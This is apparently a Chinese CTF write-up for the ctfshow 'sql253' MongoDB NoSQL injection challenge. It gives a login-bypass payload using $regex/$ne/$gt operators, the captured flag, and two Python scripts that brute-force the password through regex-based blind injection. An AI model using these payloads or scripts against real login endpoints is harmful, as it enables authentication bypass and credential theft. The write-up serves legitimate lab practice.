# ctfshow-sql253



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623

郁离歌大佬 https://blog.csdn.net/like98k/article/details/79436463

sql常见方法及udf提权   https://blog.csdn.net/qq_43645782/article/details/105468416

bit  https://www.xl-bit.cn/index.php/archives/93/





 查询语句 

```
  //sql
  db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
```



 返回逻辑 

```
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
      

```



```sql
补充一下nosql注入笔记
http://rui0.cn/archives/609
https://www.anquanke.com/post/id/97211





$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/


//查询age = 22的记录
db.userInfo.find({"age": 22});
//相当于：select * from userInfo where age = 22;
//查询age > 22的记录
db.userInfo.find({age: {$gt: 22}});
//相当于：select * from userInfo where age > 22;



mongodb的find().pretty()方法的作用。
使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。


脑洞 username 是 flag，username[$regex]=flag&password[$ne]=1 可以登录成功，写个脚本正则布尔盲注密码
其实就是爆破password 得到的就是flag
username[$regex]=flag&password[$gt]=1
登录成功
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[]}

ctfshow{fd1512cd-8341-4902-9b9d-737f34d7d8a9}
下面是两个脚本 原理都是一样
```



```python
import requests

url="http://32366c2c-4d19-473f-a732-32c69a561891.challenge.ctf.show/api/"

flag=""

for i in range(1,100):
    for j in "{-abcdefghijklmnopqrstuvwxyz0123456789}":
        payload="^{}.*$".format(flag+j)
        data={
            'username[$regex]':'flag',
            'password[$regex]':payload
        }
        r=requests.post(url=url,data=data)
        if r"\u767b\u9646\u6210\u529f" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break
```



```python
import string
import requests

url = "http://32366c2c-4d19-473f-a732-32c69a561891.challenge.ctf.show/api/"

letters = "{}-_" + string.ascii_lowercase + string.digits


def valid_pass(password: str) -> bool:
    data = {
        "username[$regex]": "flag",
        "password[$regex]": f"{password}.*"
    }
    response = requests.post(url, data=data)
    return "登陆成功" in response.json()["msg"]


result = ""

while True:
    for letter in letters:
        if valid_pass(result + letter):
            result += letter
            print(f"[*] result: {result}")
            break
```



















